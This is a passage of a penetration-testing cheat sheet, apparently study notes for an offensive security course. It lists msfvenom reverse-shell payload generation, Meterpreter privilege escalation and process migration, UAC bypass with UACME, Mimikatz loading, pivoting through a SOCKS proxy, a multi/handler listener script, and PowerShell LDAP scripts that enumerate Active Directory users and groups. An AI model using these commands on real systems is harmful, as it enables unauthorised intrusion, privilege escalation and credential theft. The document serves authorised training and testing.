</span><span id="__span-141-11"><a id="__codelineno-141-11" name="__codelineno-141-11" href="#__codelineno-141-11"></a>meterpreter &gt; channel -l 
</span><span id="__span-141-12"><a id="__codelineno-141-12" name="__codelineno-141-12" href="#__codelineno-141-12"></a>meterpreter &gt; channel -i [ID]
</span></code></pre></div>
<p><strong><em>Executable Payloads</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a><span class="gu">## List Payloads</span>
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a>msfvenom -l payloads --platform windows --arch x64
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a>
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#__codelineno-142-4"></a><span class="gu">## Generate payload - Non-staged</span>
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#__codelineno-142-5"></a>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o nonstaged.exe
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#__codelineno-142-6"></a>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#__codelineno-142-7"></a><span class="gu">## Generate payload - Staged</span>
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8" href="#__codelineno-142-8"></a>msfvenom -p windows/x64/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o staged.exe
</span></code></pre></div>
<aside>


For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat for the payload to work.

</aside>

<h3 id="performing-post-exploitation-with-metasploit"><strong>Performing Post-Exploitation with Metasploit</strong></h3>
<p><strong><em>Core Meterpreter Post-Exploitation Features</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a><span class="gu">## Display the time for which a user has been idle</span>
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#__codelineno-143-2"></a>meterpreter &gt; idletime
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#__codelineno-143-3"></a>
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#__codelineno-143-4"></a><span class="gu">## Get SYSTEM privleges</span>
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5" href="#__codelineno-143-5"></a>meterpreter &gt; getsystem
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6" href="#__codelineno-143-6"></a>
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7" href="#__codelineno-143-7"></a><span class="gu">## Migrate to differenct process</span>
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8" href="#__codelineno-143-8"></a>meterpreter &gt; ps
</span><span id="__span-143-9"><a id="__codelineno-143-9" name="__codelineno-143-9" href="#__codelineno-143-9"></a>meterpreter &gt; migrate [Process ID]
</span><span id="__span-143-10"><a id="__codelineno-143-10" name="__codelineno-143-10" href="#__codelineno-143-10"></a>meterpreter &gt; post/windows/manage/migrate
</span><span id="__span-143-11"><a id="__codelineno-143-11" name="__codelineno-143-11" href="#__codelineno-143-11"></a>
</span><span id="__span-143-12"><a id="__codelineno-143-12" name="__codelineno-143-12" href="#__codelineno-143-12"></a><span class="gu">## Create new process and migrate to it </span>
</span><span id="__span-143-13"><a id="__codelineno-143-13" name="__codelineno-143-13" href="#__codelineno-143-13"></a>meterpreter &gt; execute -H -f notepad
</span><span id="__span-143-14"><a id="__codelineno-143-14" name="__codelineno-143-14" href="#__codelineno-143-14"></a>meterpreter &gt; migrate 2720
</span></code></pre></div>
<p><strong><em>Post-Exploitation Modules</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a><span class="gu">## Bypass UAC</span>
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2" href="#__codelineno-144-2"></a>msf6 &gt; search UAC
</span><span id="__span-144-3"><a id="__codelineno-144-3" name="__codelineno-144-3" href="#__codelineno-144-3"></a>msf6 &gt; use exploit/windows/local/bypassuac_sdclt
</span><span id="__span-144-4"><a id="__codelineno-144-4" name="__codelineno-144-4" href="#__codelineno-144-4"></a>
</span><span id="__span-144-5"><a id="__codelineno-144-5" name="__codelineno-144-5" href="#__codelineno-144-5"></a><span class="gu">## Check if UAC is enabled</span>
</span><span id="__span-144-6"><a id="__codelineno-144-6" name="__codelineno-144-6" href="#__codelineno-144-6"></a>meterpreter &gt; run post/windows/gather/win_priv
</span><span id="__span-144-7"><a id="__codelineno-144-7" name="__codelineno-144-7" href="#__codelineno-144-7"></a>meterpreter &gt; search bypassuac
</span><span id="__span-144-8"><a id="__codelineno-144-8" name="__codelineno-144-8" href="#__codelineno-144-8"></a>msf &gt; use exploit/windiws/local/bypass_vbs
</span><span id="__span-144-9"><a id="__codelineno-144-9" name="__codelineno-144-9" href="#__codelineno-144-9"></a>msf &gt; set session &lt;session_id&gt;
</span><span id="__span-144-10"><a id="__codelineno-144-10" name="__codelineno-144-10" href="#__codelineno-144-10"></a>
</span><span id="__span-144-11"><a id="__codelineno-144-11" name="__codelineno-144-11" href="#__codelineno-144-11"></a>
</span><span id="__span-144-12"><a id="__codelineno-144-12" name="__codelineno-144-12" href="#__codelineno-144-12"></a><span class="gu">## UAC Bypass using UACME tool</span>
</span><span id="__span-144-13"><a id="__codelineno-144-13" name="__codelineno-144-13" href="#__codelineno-144-13"></a>https://github.com/hfiref0x/UACME
</span><span id="__span-144-14"><a id="__codelineno-144-14" name="__codelineno-144-14" href="#__codelineno-144-14"></a>meterpreter &gt; upload Akagi64.exe
</span><span id="__span-144-15"><a id="__codelineno-144-15" name="__codelineno-144-15" href="#__codelineno-144-15"></a>meterpreter &gt; upload Payload.exe                  
</span><span id="__span-144-16"><a id="__codelineno-144-16" name="__codelineno-144-16" href="#__codelineno-144-16"></a>shell &gt; .\Akagi64.exe 23 C:\Payload.exe           
</span><span id="__span-144-17"><a id="__codelineno-144-17" name="__codelineno-144-17" href="#__codelineno-144-17"></a>shell &gt; .\Akagi64.exe 61 C:\Payload.exe           
</span><span id="__span-144-18"><a id="__codelineno-144-18" name="__codelineno-144-18" href="#__codelineno-144-18"></a>
</span><span id="__span-144-19"><a id="__codelineno-144-19" name="__codelineno-144-19" href="#__codelineno-144-19"></a><span class="gu">## Load Extensions - Mimikatz</span>
</span><span id="__span-144-20"><a id="__codelineno-144-20" name="__codelineno-144-20" href="#__codelineno-144-20"></a>msf6 &gt; load ?
</span><span id="__span-144-21"><a id="__codelineno-144-21" name="__codelineno-144-21" href="#__codelineno-144-21"></a>msf6 &gt; load kiwi
</span><span id="__span-144-22"><a id="__codelineno-144-22" name="__codelineno-144-22" href="#__codelineno-144-22"></a>msf6 &gt; help
</span></code></pre></div>
<p><strong><em>Pivoting with Metasploit</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>meterpreter &gt; run autoroute -s 10.10.10.0/24
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#__codelineno-145-2"></a>meterpreter &gt; run autoroute -p
</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3" href="#__codelineno-145-3"></a>
</span><span id="__span-145-4"><a id="__codelineno-145-4" name="__codelineno-145-4" href="#__codelineno-145-4"></a>background
</span><span id="__span-145-5"><a id="__codelineno-145-5" name="__codelineno-145-5" href="#__codelineno-145-5"></a>use auxiliary/server/socks_proxy
</span><span id="__span-145-6"><a id="__codelineno-145-6" name="__codelineno-145-6" href="#__codelineno-145-6"></a>show options
</span><span id="__span-145-7"><a id="__codelineno-145-7" name="__codelineno-145-7" href="#__codelineno-145-7"></a>set SVRPORT [9050]
</span><span id="__span-145-8"><a id="__codelineno-145-8" name="__codelineno-145-8" href="#__codelineno-145-8"></a>set VERSION [4a]
</span><span id="__span-145-9"><a id="__codelineno-145-9" name="__codelineno-145-9" href="#__codelineno-145-9"></a>exploit
</span><span id="__span-145-10"><a id="__codelineno-145-10" name="__codelineno-145-10" href="#__codelineno-145-10"></a>jobs
</span><span id="__span-145-11"><a id="__codelineno-145-11" name="__codelineno-145-11" href="#__codelineno-145-11"></a>
</span><span id="__span-145-12"><a id="__codelineno-145-12" name="__codelineno-145-12" href="#__codelineno-145-12"></a><span class="gu">## Autoroutes</span>
</span><span id="__span-145-13"><a id="__codelineno-145-13" name="__codelineno-145-13" href="#__codelineno-145-13"></a>msf6 &gt; use multi/manage/autoroute
</span><span id="__span-145-14"><a id="__codelineno-145-14" name="__codelineno-145-14" href="#__codelineno-145-14"></a>msf6 post(multi/manage/autoroute) &gt; set session [Session ID]
</span><span id="__span-145-15"><a id="__codelineno-145-15" name="__codelineno-145-15" href="#__codelineno-145-15"></a>
</span><span id="__span-145-16"><a id="__codelineno-145-16" name="__codelineno-145-16" href="#__codelineno-145-16"></a><span class="gu">## Port Forwarding</span>
</span><span id="__span-145-17"><a id="__codelineno-145-17" name="__codelineno-145-17" href="#__codelineno-145-17"></a>meterpreter &gt; portfwd add -l [Local IP] -p [Remote IP] -r [Host]
</span></code></pre></div>
<h3 id="automating-metasploit"><strong>Automating Metasploit</strong></h3>
<p><strong><em>Resource Scripts</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a><span class="gu">## Pre installed resource scripts</span>
</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2" href="#__codelineno-146-2"></a>ls -l /usr/share/metasploit-framework/scripts/resource
</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3" href="#__codelineno-146-3"></a>
</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4" href="#__codelineno-146-4"></a><span class="gu">## Manually create resource script - resource.rc</span>
</span><span id="__span-146-5"><a id="__codelineno-146-5" name="__codelineno-146-5" href="#__codelineno-146-5"></a>use exploit/multi/handler
</span><span id="__span-146-6"><a id="__codelineno-146-6" name="__codelineno-146-6" href="#__codelineno-146-6"></a>set PAYLOAD windows/meterpreter_reverse_https
</span><span id="__span-146-7"><a id="__codelineno-146-7" name="__codelineno-146-7" href="#__codelineno-146-7"></a>set LHOST 192.168.119.4
</span><span id="__span-146-8"><a id="__codelineno-146-8" name="__codelineno-146-8" href="#__codelineno-146-8"></a>set LPORT 443
</span><span id="__span-146-9"><a id="__codelineno-146-9" name="__codelineno-146-9" href="#__codelineno-146-9"></a>set AutoRunScript post/windows/manage/migrate 
</span><span id="__span-146-10"><a id="__codelineno-146-10" name="__codelineno-146-10" href="#__codelineno-146-10"></a>set ExitOnSession false
</span><span id="__span-146-11"><a id="__codelineno-146-11" name="__codelineno-146-11" href="#__codelineno-146-11"></a>run -z -j
</span><span id="__span-146-12"><a id="__codelineno-146-12" name="__codelineno-146-12" href="#__codelineno-146-12"></a>
</span><span id="__span-146-13"><a id="__codelineno-146-13" name="__codelineno-146-13" href="#__codelineno-146-13"></a>msfconsole -r resource.rc
</span></code></pre></div>
<hr />
<h2 id="active-directory-introduction-and-enumeration"><strong>Active Directory Introduction and Enumeration</strong></h2>
<h3 id="active-directory-manual-enumeration"><strong>Active Directory - Manual Enumeration</strong></h3>
<aside>


While there is a Domain Admins group for each domain in the forest, members of the *Enterprise Admins* group are granted full control over all the domains in the forest and have Administrator privilege on all DCs

</aside>

<h4 id="active-directory-enumeration-using-legacy-windows-tools"><strong>Active Directory - Enumeration Using Legacy Windows Tools</strong></h4>
<aside>


When you have access to AD credentials, we suggest using RDP as much as 
possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as  you will experience the [Kerberos Double Hop](https://posts.slayerlabs.com/double-hop/) issue. To avoid it, the simplest way is to use RDP.

</aside>

<div class="language-powershell highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a><span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2" href="#__codelineno-147-2"></a><span class="n">net</span> <span class="nb">group </span><span class="p">/</span><span class="n">domain</span>
</span><span id="__span-147-3"><a id="__codelineno-147-3" name="__codelineno-147-3" href="#__codelineno-147-3"></a>
</span><span id="__span-147-4"><a id="__codelineno-147-4" name="__codelineno-147-4" href="#__codelineno-147-4"></a><span class="n">net</span> <span class="n">user</span> <span class="no">[user]</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-147-5"><a id="__codelineno-147-5" name="__codelineno-147-5" href="#__codelineno-147-5"></a><span class="n">net</span> <span class="nb">group </span><span class="no">[group]</span> <span class="p">/</span><span class="n">domain</span>
</span></code></pre></div>
<p><strong><em>Default Domain Groups</em></strong></p>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">Active Directory Security Groups</a></p>
<h4 id="enumerating-active-directory-using-powershell-and-net-classes"><strong>Enumerating Active Directory using PowerShell and .NET Classes</strong></h4>
<p><strong><em>Invoke the Domain Class and the GetCurrentDomain method - PdcRoleOwner property</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</span></code></pre></div>
<p><strong><em>enumeration.ps1</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a><span class="c">## Store the domain object in the $domainObj variable</span>
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2" href="#__codelineno-149-2"></a><span class="nv">$domainObj</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3" href="#__codelineno-149-3"></a>
</span><span id="__span-149-4"><a id="__codelineno-149-4" name="__codelineno-149-4" href="#__codelineno-149-4"></a><span class="c">## Print the variable</span>
</span><span id="__span-149-5"><a id="__codelineno-149-5" name="__codelineno-149-5" href="#__codelineno-149-5"></a><span class="nv">$domainObj</span>
</span><span id="__span-149-6"><a id="__codelineno-149-6" name="__codelineno-149-6" href="#__codelineno-149-6"></a>
</span><span id="__span-149-7"><a id="__codelineno-149-7" name="__codelineno-149-7" href="#__codelineno-149-7"></a><span class="c">## Store the PdcRoleOwner name to the $PDC variable</span>
</span><span id="__span-149-8"><a id="__codelineno-149-8" name="__codelineno-149-8" href="#__codelineno-149-8"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-149-9"><a id="__codelineno-149-9" name="__codelineno-149-9" href="#__codelineno-149-9"></a>
</span><span id="__span-149-10"><a id="__codelineno-149-10" name="__codelineno-149-10" href="#__codelineno-149-10"></a><span class="c">## Print the $PDC variable</span>
</span><span id="__span-149-11"><a id="__codelineno-149-11" name="__codelineno-149-11" href="#__codelineno-149-11"></a><span class="nv">$PDC</span>
</span><span id="__span-149-12"><a id="__codelineno-149-12" name="__codelineno-149-12" href="#__codelineno-149-12"></a>
</span><span id="__span-149-13"><a id="__codelineno-149-13" name="__codelineno-149-13" href="#__codelineno-149-13"></a><span class="c">## Store the Distinguished Name variable into the $DN variable</span>
</span><span id="__span-149-14"><a id="__codelineno-149-14" name="__codelineno-149-14" href="#__codelineno-149-14"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span>
</span><span id="__span-149-15"><a id="__codelineno-149-15" name="__codelineno-149-15" href="#__codelineno-149-15"></a>
</span><span id="__span-149-16"><a id="__codelineno-149-16" name="__codelineno-149-16" href="#__codelineno-149-16"></a><span class="c">## Print the $DN variable</span>
</span><span id="__span-149-17"><a id="__codelineno-149-17" name="__codelineno-149-17" href="#__codelineno-149-17"></a><span class="nv">$DN</span>
</span></code></pre></div>
<p><strong><em>Build the full LDAP path</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#__codelineno-150-2"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
</span><span id="__span-150-3"><a id="__codelineno-150-3" name="__codelineno-150-3" href="#__codelineno-150-3"></a><span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
</span><span id="__span-150-4"><a id="__codelineno-150-4" name="__codelineno-150-4" href="#__codelineno-150-4"></a><span class="nv">$LDAP</span>
</span></code></pre></div>
<h4 id="adding-search-functionality-to-our-script"><strong>Adding Search Functionality to our Script</strong></h4>
<p><strong><em>Basic script to get each object in AD environment</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2" href="#__codelineno-151-2"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3" href="#__codelineno-151-3"></a><span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4" href="#__codelineno-151-4"></a>
</span><span id="__span-151-5"><a id="__codelineno-151-5" name="__codelineno-151-5" href="#__codelineno-151-5"></a><span class="nv">$direntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nv">$LDAP</span><span class="p">)</span>
</span><span id="__span-151-6"><a id="__codelineno-151-6" name="__codelineno-151-6" href="#__codelineno-151-6"></a>
</span><span id="__span-151-7"><a id="__codelineno-151-7" name="__codelineno-151-7" href="#__codelineno-151-7"></a><span class="nv">$dirsearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$direntry</span><span class="p">)</span>
</span><span id="__span-151-8"><a id="__codelineno-151-8" name="__codelineno-151-8" href="#__codelineno-151-8"></a><span class="nv">$dirsearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span></code></pre></div>
<p><strong><em>Filter to enumerate all users in domain</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a><span class="nv">$domainObj</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</span><span id="__span-152-2"><a id="__codelineno-152-2" name="__codelineno-152-2" href="#__codelineno-152-2"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-152-3"><a id="__codelineno-152-3" name="__codelineno-152-3" href="#__codelineno-152-3"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
</span><span id="__span-152-4"><a id="__codelineno-152-4" name="__codelineno-152-4" href="#__codelineno-152-4"></a><span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
</span><span id="__span-152-5"><a id="__codelineno-152-5" name="__codelineno-152-5" href="#__codelineno-152-5"></a>
</span><span id="__span-152-6"><a id="__codelineno-152-6" name="__codelineno-152-6" href="#__codelineno-152-6"></a><span class="nv">$direntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nv">$LDAP</span><span class="p">)</span>
</span><span id="__span-152-7"><a id="__codelineno-152-7" name="__codelineno-152-7" href="#__codelineno-152-7"></a>
</span><span id="__span-152-8"><a id="__codelineno-152-8" name="__codelineno-152-8" href="#__codelineno-152-8"></a><span class="nv">$dirsearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$direntry</span><span class="p">)</span>
</span><span id="__span-152-9"><a id="__codelineno-152-9" name="__codelineno-152-9" href="#__codelineno-152-9"></a><span class="nv">$dirsearcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&quot;samAccountType=805306368&quot;</span>
</span><span id="__span-152-10"><a id="__codelineno-152-10" name="__codelineno-152-10" href="#__codelineno-152-10"></a><span class="nv">$result</span> <span class="p">=</span> <span class="nv">$dirsearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span><span id="__span-152-11"><a id="__codelineno-152-11" name="__codelineno-152-11" href="#__codelineno-152-11"></a>
</span><span id="__span-152-12"><a id="__codelineno-152-12" name="__codelineno-152-12" href="#__codelineno-152-12"></a><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$result</span><span class="p">)</span>
</span><span id="__span-152-13"><a id="__codelineno-152-13" name="__codelineno-152-13" href="#__codelineno-152-13"></a><span class="p">{</span>
</span><span id="__span-152-14"><a id="__codelineno-152-14" name="__codelineno-152-14" href="#__codelineno-152-14"></a>    <span class="k">Foreach</span><span class="p">(</span><span class="nv">$prop</span> <span class="k">in</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Properties</span><span class="p">)</span>
</span><span id="__span-152-15"><a id="__codelineno-152-15" name="__codelineno-152-15" href="#__codelineno-152-15"></a>    <span class="p">{</span>
</span><span id="__span-152-16"><a id="__codelineno-152-16" name="__codelineno-152-16" href="#__codelineno-152-16"></a>        <span class="nv">$prop</span>
</span><span id="__span-152-17"><a id="__codelineno-152-17" name="__codelineno-152-17" href="#__codelineno-152-17"></a>    <span class="p">}</span>
</span><span id="__span-152-18"><a id="__codelineno-152-18" name="__codelineno-152-18" href="#__codelineno-152-18"></a>
</span><span id="__span-152-19"><a id="__codelineno-152-19" name="__codelineno-152-19" href="#__codelineno-152-19"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;-------------------------------&quot;</span>
</span><span id="__span-152-20"><a id="__codelineno-152-20" name="__codelineno-152-20" href="#__codelineno-152-20"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Example of filter only certain User memberships</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a><span class="nv">$domainObj</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2" href="#__codelineno-153-2"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-153-3"><a id="__codelineno-153-3" name="__codelineno-153-3" href="#__codelineno-153-3"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
</span><span id="__span-153-4"><a id="__codelineno-153-4" name="__codelineno-153-4" href="#__codelineno-153-4"></a><span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
</span><span id="__span-153-5"><a id="__codelineno-153-5" name="__codelineno-153-5" href="#__codelineno-153-5"></a>
</span><span id="__span-153-6"><a id="__codelineno-153-6" name="__codelineno-153-6" href="#__codelineno-153-6"></a><span class="nv">$direntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nv">$LDAP</span><span class="p">)</span>
</span><span id="__span-153-7"><a id="__codelineno-153-7" name="__codelineno-153-7" href="#__codelineno-153-7"></a>
</span><span id="__span-153-8"><a id="__codelineno-153-8" name="__codelineno-153-8" href="#__codelineno-153-8"></a><span class="nv">$dirsearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$direntry</span><span class="p">)</span>
</span><span id="__span-153-9"><a id="__codelineno-153-9" name="__codelineno-153-9" href="#__codelineno-153-9"></a><span class="nv">$dirsearcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&quot;name=jeffadmin&quot;</span>
</span><span id="__span-153-10"><a id="__codelineno-153-10" name="__codelineno-153-10" href="#__codelineno-153-10"></a><span class="nv">$result</span> <span class="p">=</span> <span class="nv">$dirsearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span><span id="__span-153-11"><a id="__codelineno-153-11" name="__codelineno-153-11" href="#__codelineno-153-11"></a>
</span><span id="__span-153-12"><a id="__codelineno-153-12" name="__codelineno-153-12" href="#__codelineno-153-12"></a><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$result</span><span class="p">)</span>
</span><span id="__span-153-13"><a id="__codelineno-153-13" name="__codelineno-153-13" href="#__codelineno-153-13"></a><span class="p">{</span>
</span><span id="__span-153-14"><a id="__codelineno-153-14" name="__codelineno-153-14" href="#__codelineno-153-14"></a>    <span class="k">Foreach</span><span class="p">(</span><span class="nv">$prop</span> <span class="k">in</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Properties</span><span class="p">)</span>
</span><span id="__span-153-15"><a id="__codelineno-153-15" name="__codelineno-153-15" href="#__codelineno-153-15"></a>    <span class="p">{</span>
</span><span id="__span-153-16"><a id="__codelineno-153-16" name="__codelineno-153-16" href="#__codelineno-153-16"></a>        <span class="nv">$prop</span><span class="p">.</span><span class="n">memberof</span>
</span><span id="__span-153-17"><a id="__codelineno-153-17" name="__codelineno-153-17" href="#__codelineno-153-17"></a>    <span class="p">}</span>
</span><span id="__span-153-18"><a id="__codelineno-153-18" name="__codelineno-153-18" href="#__codelineno-153-18"></a>
</span><span id="__span-153-19"><a id="__codelineno-153-19" name="__codelineno-153-19" href="#__codelineno-153-19"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;-------------------------------&quot;</span>
</span><span id="__span-153-20"><a id="__codelineno-153-20" name="__codelineno-153-20" href="#__codelineno-153-20"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Automation - Pass the parameter to filter the objects</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a><span class="k">function</span> <span class="n">LDAPSearch</span> <span class="p">{</span>
</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2" href="#__codelineno-154-2"></a>    <span class="k">param</span> <span class="p">(</span>
</span><span id="__span-154-3"><a id="__codelineno-154-3" name="__codelineno-154-3" href="#__codelineno-154-3"></a>        <span class="no">[string]</span><span class="nv">$LDAPQuery</span>
</span><span id="__span-154-4"><a id="__codelineno-154-4" name="__codelineno-154-4" href="#__codelineno-154-4"></a>    <span class="p">)</span>
</span><span id="__span-154-5"><a id="__codelineno-154-5" name="__codelineno-154-5" href="#__codelineno-154-5"></a>
